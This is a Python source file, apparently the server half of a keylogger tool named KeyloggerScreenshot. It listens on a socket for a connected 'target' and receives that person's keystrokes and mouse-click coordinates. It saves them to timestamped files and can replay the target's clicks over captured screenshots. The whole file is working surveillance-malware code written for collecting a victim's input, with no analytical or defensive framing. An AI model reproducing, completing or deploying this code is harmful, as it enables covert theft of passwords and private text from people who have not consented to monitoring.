import PIL.Image
import time
import sys
import socket
import pyautogui as pg
import os
import threading
import ast
import BetterPrinting as bp
import tkinter as tk
from .Server_photos import ServerPhotos
from .Port_data import get_working_ports

class ServerKeylogger:
    # This is the class of the Server. Both Server should not be in the same file
    def __init__(self, ip, port, simulater=False):
        self.ip = ip
        self.port = port
        self.simulater = simulater
        self.new_data = None
        self.check_under = False

    def message(self, real_data):
        # To know if the server has some issues
        for zeichen in real_data:
            if "{" == zeichen:
                # "{" this detects if a space or a tab is in full_msg
                self.new_data = real_data.replace("{", " ")
                self.check_under = True

        if self.check_under is False:
            self.new_data = real_data

        print(self.check_under)
        # The data is being stored in full_msg
        bp.color(f"Text of target: {self.new_data}", "magenta")
        zeit = time.strftime("%H-%M-%S-%Y")
        # This is the time the data has arrived
        if self.new_data != "":
            with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
                file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{self.new_data}")

        else:
            bp.color("The Target didn't type something...", "magenta")

    def check_double(self):  # This function is here to check if there are more files with the same name
        dir = os.listdir()
        check = [each_name for each_name in dir if "mouseInfo" in each_name]
        if len(check) == 0:
            filename = "mouseInfoLog.txt"
        else:
            amount = len(check) + 1
            filename = f"mouseInfoLog {amount}.txt"

        return filename

    def countdown(self):
        global seconds
        global startbutton
        global tkWindow
        real_sec = seconds
        seconds = seconds + 4
        # Plus four seconds because of the time the code sleeps

        if sys.platform == "linux":
            size = "295x367"
        else:
            size = "250x415"

        tkWindow = tk.Tk()
        tkWindow.geometry(size)
        tkWindow.title('KeyloggerScreenshot')
        minutes = seconds // 60
        this_min = minutes * 60
        this_sec = seconds - this_min
        if minutes > 0:
            print(f"This simulation will last for {minutes} minutes and {this_sec} seconds\n")
        elif minutes > 0 and this_sec == 0:
            print(f"This simulation will last for {minutes} minutes\n")
        elif minutes == 0:
            print(f"This simulation will last for {this_sec} seconds\n")

        while seconds:  # Same like Timer Class
            mins, secs = divmod(seconds, 60)
            timer = '{:02d}:{:02d}'.format(mins, secs)
            print(f"\rTime left: {timer}", end="")
            time.sleep(1)
            seconds -= 1

        print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
        # GUI BY: DYMA020
        startbutton = tk.Button(tkWindow, text="Stop stimulation", command=self.changecol, height=10, width=30)
        # Puts everything on place
        startbutton.grid(row=1, column=0)
        if real_sec < 60:
            text = f"Simulation for {real_sec} seconds"
        else:
            m, s = divmod(real_sec, 60)
            timer = '{:02d}:{:02d}'.format(m, s)
            text = f"Simulation for {timer} minutes"
        # Just for decoration
        tk.Button(tkWindow, text=text, command=self.connection, height=10, width=30).grid(row=2, column=0)
        tkWindow.mainloop()

    def changecol(self):  # This function is here to if the simulation has ended
        startbutton.configure(bg="red")
        # This is the button
        startbutton["text"] = "Stop simulation"
        tkWindow.destroy()

    def connection(self):
        print("Successful connection")

    def start(self):
        global seconds
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((self.ip, self.port))
            server.listen(1000)

            bp.color("Waiting for connection....", "magenta")
            clientsocket, ipaddress = server.accept()
            # Data is in clientsocket and the ip-address is obviously in "ipaddress"
            bp.color(f"\nConnection has been established with {ipaddress}", "magenta")

            full_msg = ServerPhotos.get_data(self, clientsocket, "r", 8192)
            if ")]" in full_msg:
                # Checks if the coordinates are there
                cord = full_msg.split(")]")
                new_cor = cord[0] + ")]"
                direct = os.listdir()

                filename = self.check_double()
                with open(filename, "a+") as file:
                    # The coordinates will be stored in "mouseInfoLog.txt"
                    file.write(f"These are the coordinates of the target \n{new_cor}")
                bp.color("The coordinates of the target have been saved to your directory", "magenta")

                if cord[1] == "":
                    bp.color("The target hasn't typed anything", "magenta")
                else:
                    self.message(cord[1])

            elif "{" in full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in full_msg:
                # This checks if the target hasn't clicked something and if there is still some data
                full_msg = full_msg.replace("[]", "")
                bp.color("The target hasn't clicked anything", "magenta")
                self.message(full_msg)

            elif "[]" == full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in full_msg:
                # Checks if nothing has typed or clicked
                bp.color("The target hasn't typed and clicked anything", "magenta")

            else:
                spalten = full_msg.split("***%§§)§§%")
                # This splits the data with the special code
                if spalten[1] != "":
                    # If the data is not empty
                    text = spalten[1]
                    for zeichen in text:
                        if "{" == zeichen:
                            text = text.replace("{", " ")
                    bp.color(f"Text of target: {text}", "magenta")
                    zeit = time.strftime("%H-%M-%S-%Y")
                    # This is the time the data has arrived
                    with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
                        file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{text}")
                        # That means data will appear even if the connection isn't stabled
                else:
                    bp.color("The target hasn't written something in the meanwhile", "magenta")

                bp.color("\nTHE CONNECTION HAS BEEN INTERRUPTED", "magenta")
                bp.color("THE SERVER WILL BE DESTROYED\n", "magenta")
                os._exit(0)
                # This shuts down the server


            if self.simulater is True:
                print("Simulation will come in 10 seconds!!!")
                time.sleep(10)
                start = input("Do you want to start y/n?: ")
                if start not in ["y", "yes"]:
                    print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
                    sys.exit()

                mouse_coordinates = [mouse for mouse in os.listdir() if "mouseInfoLog" in mouse]
                # Looks for coordinates in mouseInfoLog

                if not mouse_coordinates:
                    # If there isn't a file called mouseInfoLog it will destroy itself
                    print("\nThe target hasn't clicked anything")
                    print("THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
                    sys.exit()

                every_coordinate = []
                for each_core in mouse_coordinates:
                    fhandle = open(each_core)
                    for line in fhandle:
                        if "[" in line:
                            every_coordinate += ast.literal_eval(line)
                            # This makes a list out of a string

                img_files = [each_img for each_img in os.listdir() if "New_Image" in each_img]
                # This checks for all Images in the directory

                if not img_files:
                    print('There is no "New_Image" in this directory')
                    sys.exit()

                pg.FAILSAFE = False
                # This is for the corner allowance
                img_seconds = 5.572
                # This is the speed it takes to open the image
                speed = 0.47
                # This is the time each coordinate needs
                sleep = 1.5
                # This is the time where the code is taking a time out
                one_coordinate = speed + sleep

                duration_seconds = one_coordinate * len(every_coordinate)
                one_image = duration_seconds + img_seconds
                summed_up = one_image * len(img_files)
                seconds = round(summed_up)

                print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
                print(f"{len(img_files)} Image files are being used")

                threading_count = threading.Thread(target=self.countdown)
                # The countdown will start
                threading_count.start()

                pg.sleep(4)
                for image in img_files:
                    im = PIL.Image.open(image)
                    # Opens the image
                    im.show()
                    time.sleep(2)
                    pg.press("f11")
                    # Makes the image in the perfect resolution
                    for x, y in every_coordinate:
                        pg.moveTo(x, y, 0.3)
                        time.sleep(sleep)
                    pg.press("esc")

        except OSError:
            working_port = get_working_ports()
            if str(self.port) in working_port:
                bp.color(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERKEYLOGGER. PORT NUMBER: {self.port} already in use", "magenta")
                os._exit(0)
